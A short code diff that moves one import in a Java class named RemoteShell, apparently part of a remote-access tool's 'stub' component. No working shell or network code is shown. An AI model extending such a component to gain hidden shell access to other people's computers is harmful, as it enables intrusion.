@@ -4,7 +4,7 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
 import com.redpois0n.common.OperatingSystem;
-import com.redpois0n.packets.outgoing.Packet21RemoteShell;
+import com.redpois0n.stub.packets.outgoing.Packet21RemoteShell;
 
 public class RemoteShell extends Thread {
 
